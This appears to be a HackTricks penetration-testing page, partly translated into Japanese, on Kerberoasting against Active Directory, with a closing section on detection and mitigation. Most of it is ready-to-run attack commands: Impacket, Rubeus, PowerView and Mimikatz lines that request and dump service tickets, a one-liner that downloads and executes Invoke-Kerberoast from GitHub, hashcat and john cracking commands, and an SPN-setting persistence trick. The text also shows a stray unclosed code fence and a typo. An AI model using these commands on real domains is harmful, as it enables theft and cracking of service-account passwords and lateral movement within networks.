# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoastingは、**Active Directory (AD)**内の**ユーザーアカウント**に関連する**TGSチケット**の取得に焦点を当てており、**コンピューターアカウント**は除外されます。これらのチケットの暗号化には**ユーーパスワード**から派生したキーが使用されており、**オフラインの資格情報クラッキング**の可能性があります。ユーザーアカウントがサービスとして使用されていることは、非空の**"ServicePrincipalName"**プロパティによって示されます。

**Kerberoasting**を実行するには、**TGSチケット**を要求できるドメインアカウントが必要ですが、このプロセスには**特別な権限**は必要なく、**有効なドメイン資格情報**を持つ誰でもアクセス可能です。

### キーポイント:

- **Kerberoasting**は**AD**内の**ユーザーアカウントサービス**の**TGSチケット**をターゲットにします。
- **ユーザーパスワード**からのキーで暗号化されたチケットは**オフラインでクラッキング**可能です。
- サービスは、nullでない**ServicePrincipalName**によって識別されます。
- **特別な権限**は不要で、**有効なドメイン資格情報**のみが必要です。

### **攻撃**

> [!WARNING]
> **Kerberoastingツール**は、攻撃を実行しTGS-REQリクエストを開始する際に通常**`RC4暗号`**を要求します。これは、**RC4が** [**より弱い**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795)ため、AES-128やAES-256などの他の暗号アルゴリズムよりもHashcatなどのツールを使用してオフラインでクラッキングしやすいからです。\
> RC4（タイプ23）ハッシュは**`$krb5tgs$23$*`**で始まり、AES-256（タイプ18）は**`$krb5tgs$18$*`**で始まります。\
> さらに、`Rubeus.exe kerberoast`は、すべての脆弱なアカウントに対して自動的にチケットを要求するため、検出される可能性があります。まず、興味深い権限を持つkerberoastableユーザーを見つけてから、それらに対してのみ実行してください。
```bash

#### **Linux**

```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # パスワードが求められます
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. kerberoastableユーザーを列挙する
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. ハッシュをダンプする
```

Multi-features tools including a dump of kerberoastable users:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```

#### Windows

- **Enumerate Kerberoastable users**

```bash
# Kerberoastableユーザーを取得
setspn.exe -Q */* #これは組み込みのバイナリです。ユーザーアカウントに注目してください
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```

- **Technique 1: Ask for TGS and dump it from memory**

```bash
#メモリ内の単一ユーザーからTGSを取得
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #例: MSSQLSvc/mgmt.domain.local

#すべてのkerberoastableアカウントのTGSを取得（PCを含む、あまり賢くない）
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#メモリ内のkerberosチケットをリスト
klist

#メモリからそれらを抽出
Invoke-Mimikatz -Command '"kerberos::list /export"' #チケットを現在のフォルダーにエクスポート

# kirbiチケットをjohnに変換
python2.7 kirbi2john.py sqldev.kirbi
# johnをhashcatに変換
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

- **Technique 2: Automatic tools**

```bash
# Powerview: ユーザーのKerberoastハッシュを取得
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #PowerViewを使用 Ex: MSSQLSvc/mgmt.domain.local
# Powerview: すべてのKerberoastハッシュを取得
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #特定のユーザー
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #管理者を取得

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

> [!WARNING]
> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.

### Cracking

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigation

Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:

- The service name should not be **krbtgt**, as this is a normal request.
- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

To mitigate the risk of Kerberoasting:

- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.

## Kerberoast w/o domain account

In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```

#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
